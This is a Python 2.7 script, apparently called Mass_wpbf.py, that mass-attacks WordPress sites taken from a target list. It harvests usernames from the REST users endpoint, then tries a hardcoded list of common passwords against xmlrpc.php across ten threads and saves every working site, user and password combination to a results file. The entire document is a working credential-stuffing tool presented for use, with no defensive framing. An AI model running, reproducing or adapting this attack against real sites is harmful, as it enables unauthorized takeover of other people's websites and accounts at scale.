import requests, re, sys, threading
from  time import sleep
from urlparse import urlparse
requests.packages.urllib3.disable_warnings()
import threading, time, random
from Queue import Queue

result = open("wpbrute_result.txt","a")
time = 8
verify = False

sukses = 0
gagal = 0

def brute(url, user):
	global sukses
	global gagal
	try:
		pos = url + "/xmlrpc.php"
		header = {"User-agent":"Linux Mozilla 5/0","Content-Type":"text/xml"}
		listpass = {'Password','12345678','abc123','passw0rd','iloveyou','letmein','starwars','whatever','123456','qwerty123','admin123','Admin123','qwerty','admin','fuckyou','administrator','password','superuser','devloper','pass123','password123','admin22',user}
		for pswd in listpass:
			data = ('<methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value><string>'+user+'</string></value></param><param><value><string>'+pswd+'</string></value></param></params></methodCall>')
			ab = requests.post(pos, data=data, headers=header, timeout=time, verify=verify)
			if '<member><name>isAdmin</name><value><boolean>' in ab.text:
				print("\033[32m[Login Success]\033[0m - "+user+" | "+pswd)
				result.write(url+"|"+user+"|"+pswd+"\n")
				sukses = sukses + 1
			else:
				print("\033[31m[Login Failed]\033[0m - "+user+" | "+pswd)
				gagal = gagal + 1
		print("\n\033[32;1m[+]\033[0m Valid Creds : \033[32;1m"+str(sukses)+"\n\033[31;1m[-]\033[0m Invalid Creds : \033[31;1m"+str(gagal)+"\033[0m\n")
	except Exception as err:
		print("\n\033[31m[-]\033[0m Exception : "+str(err))

def exploit(url):
	try:
		gas = requests.get(url+"/wp-json/wp/v2/users", timeout=time, verify=verify).text
		user = re.findall('"slug":"(.*?)"', gas)
		if user:
			total = 0
			for tot in user:
				total = total + 1
			print("\n\033[32m[+]\033[0m Found \033[32m"+str(total)+"\033[0m Users In \033[32m"+url+"\033[0m")
			for usr in user:
				brute(url, usr)
		else:
			print("\n\033[31m[-]\033[0m No Found User In "+url+"!")
	except Exception as err:
		print("\n\033[31m[-]\033[0m Exception : "+str(err))
try:
	list = sys.argv[1]
except:
	print("python2.7 Mass_wpbf.py list.txt")
	exit()
asu = open(list).read().splitlines()
jobs = Queue()
def do_stuff(q):
	while not q.empty():
		value = q.get()
		exploit(value)
		q.task_done()
		
for trgt in asu:
	if trgt.startswith("http://") or trgt.startswith("https://"):
		trgt = trgt
	else:
		trgt = "http://"+trgt
	jobs.put(trgt)

for i in range(10): # Set Thread If You Want, Change This Numb
	worker = threading.Thread(target=do_stuff, args=(jobs,))
	worker.start()
jobs.join()
